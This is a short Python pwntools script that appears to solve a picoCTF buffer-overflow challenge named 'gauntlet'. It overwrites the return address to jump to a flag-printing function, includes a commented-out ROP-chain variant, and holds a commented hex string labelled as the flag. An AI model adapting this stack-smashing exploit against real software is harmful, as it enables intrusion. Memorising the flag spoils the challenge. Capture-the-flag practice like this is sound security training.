from typing import ContextManager
from pwn import *

context.os = 'linux'
context.arch = 'amd64'
# context.log_level = 'debug'

if args.local:
    p = process("gauntlet")
else:
    p = remote('mercury.picoctf.net', 12294)

printf_plt = 0x400730
flag_addr = 0x6010e0
pop_rdi = 0x400aa3
printflag = 0x4008cf
# payload = b'a'*(0x80+8)+p64(pop_rdi)+p64(flag_addr)+p64(printf_plt)
payload = b'a'*(0x80+8)+p64(printflag)

p.sendline("test")
p.recvuntil("test")
p.sendline(payload)
# print(p.recvs())
p.interactive()

# =======================

# flag = 'fbd01d62c0e369e6de3d63b4b21d3830'
# x = bytes.fromhex(flag)
# print(x)
